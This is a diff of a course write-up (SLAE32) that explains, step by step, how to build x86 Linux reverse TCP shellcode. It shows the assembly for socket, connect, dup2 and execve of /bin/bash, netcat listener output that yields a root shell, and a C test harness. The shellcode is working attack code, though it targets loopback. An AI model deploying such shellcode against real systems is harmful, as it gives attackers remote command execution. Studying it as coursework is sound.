@@ -18,8 +18,8 @@ For our second assignment in the SLAE32 course we were tasks with creating rever
 _What is a reverse shell?_  
 A reverse shell is a program that is executed on a victim device, and connects to a remote host. Once the victim connects to the remote host, the victim executes an interactive shell within the connection. Input and Output of the reverse shell program is passed to the remote host, allowing the remote host to execute commands as if they were physically connected to the terminal.  
 After writting the first bind shell, shellcode I felt I had a grasp on Assembly, and skipped right into creating the shellcode.  
-
-## 1. Create the Socket.
+## Creating the Assembly Shellcode
+### 1. Create the Socket.
 #### C Function
 ```c
 int socket(int domain, int type, int protocol);
@@ -45,6 +45,8 @@ cat /usr/include/i386-linux-gnu/bits/socket.h
   - We see that `AF_INET` is mapped to `PF_INET`
 + `ECX[1] - int type = SOCK_STREAM = 0x1`
 + `ECX[2] = int protocol = 0`
+
+#### Assembly code for the socket() function
 ```nasm
 xor eax, eax  ; Clear EAX Register. EAX = 0x00000000
 mov al, 0x66  ; EBX = 0x66 = 102. SYSCAL 102 = socketcall
@@ -60,7 +62,7 @@ int 0x80      ; Execute the socket() System Call
 xchg esi, eax ; save the "sockfd" generated from the socket above 
 ```
 
-## 3. Create the Socket Address Struct
+### 2. Create the Socket Address Struct
 #### C Function
 ```c
 struct sockaddr_in {
@@ -71,19 +73,19 @@ struct sockaddr_in {
 ```
 #### Our C Function
 ```c
-{ .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = 127.1.1.1 }
+{ .sin_family = AF_INET, .sin_port = htons(1337), .sin_addr.s_addr = 127.1.1.1 }
            ARG[0]               ARG[1]                       ARG[2]
 ```
 + 
 + `ARG[0] = 0x2`
   - Value for `AF_INET`
-+ `ARG[1] = 0x5c11`
-  - This is for the TCP Port 4444.
++ `ARG[1] = 0x3905`
+  - This is for the TCP Port 1337.
 + `ARG[2] = 0x0101017f`
   - `sin_addr.s_addr`: 127.1.1.1 (big endian)
 
-## 4. Bind our Socket Address to the Socket
-### C Function
+### 3. Bind our Socket Address to the Socket
+#### C Function
 ```c
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
@@ -95,12 +97,12 @@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 + `ECX[2] = push esi`
   - This is the value we saved from creating the Socket earlier. 
 
-Assembly Code for the address struct & bind().
+#### Assembly Code for the address struct & function bind().
 ```nasm 
 xor eax, eax
 inc ebx
 push 0x0101017f    ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
-push word 0x3905   ; ARG[1]. This is for the TCP Port 4444.
+push word 0x3905   ; ARG[1]. This is for the TCP Port 1337.
 push bx	           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
 mov ecx, esp       ; Point ECX to the top of the stack. This will be used for ECX[1].
 push 0x10          ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
@@ -111,7 +113,7 @@ inc ebx            ; Connect() value for the socketcall() SYSCAL
 mov al, 0x66       ; socketcall() system call
 int 0x80           ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
 ```
-## 5. Duplicate STDIN, STDOUT, STDERR to the remote Socket. 
+### 4. Duplicate STDIN, STDOUT, STDERR to the remote Socket. 
 #### C Function
 ```c
 int dup2(int oldfd, int newfd);  
@@ -124,7 +126,7 @@ dup2( clientSocket, 2 ); // STDERR
 EAX       EBX      ECX     
 ```
 
-`dup2()` Assembly Loop code to transfer input and output to the remote socket.
+#### Assembly Loop to transfer input and output to the remote socket.
 ```nasm 
  xchg ebx, esi     ; This is our socket value returned from our `socket` systemcall.
  xor ecx, ecx      ; Clear the ECX Register
@@ -136,7 +138,7 @@ dup2loop:
  jne dup2loop      ; Jumps to the specified location if flag is set
 ```
 
-### 6. Spawn a bash shell for the remote client
+### 5. Spawn a bash shell for the remote client
 #### Default C Function
 ```c
 int execve(const char *filename, char *const argv[], char *const envp[]);
@@ -145,7 +147,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]);
 ```c
 execve("/bin/bash", NULL, NULL);
 ```
-
+#### Execve Assembly Shellcode
 ```nasm
 xor edx, edx
 push edx         ; Push NULL onto the stack 
@@ -224,16 +226,15 @@ ld revTcpSh.o -o revTcpSh
 ### Testing the reverse shell program
 ##### Terminal Window 1
 ```console
+./revTcpSh
+```
+##### Terminal Window 2
+```console
 nc.traditional -nvlp 1337
 listening on [any] 1337 ...
 connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 36505
 id
 uid=0(root) gid=0(root) groups=0(root)
-```
-##### Terminal Window 2
-```console
-./revTcpSh
- 
 ```
 ### Testing if the Shellcode works when used in another program
 #### Extracting the Shellcode Hex from the compiled binary
@@ -264,17 +265,16 @@ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
 #### Testing if our shellcode works with the program
 ##### Terminal Window 1
 ```console
+root# ./shellcode 
+Shellcode Length:  80
+```
+##### Terminal Window 2
+```console
 root# nc.traditional -nvlp 1337
 listening on [any] 1337 ...
 connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 36507
 id
 uid=0(root) gid=0(root) groups=0(root)
-```
-##### Terminal Window 2
-```console
-root# ./shellcode 
-Shellcode Length:  80
-
 ```
 
 
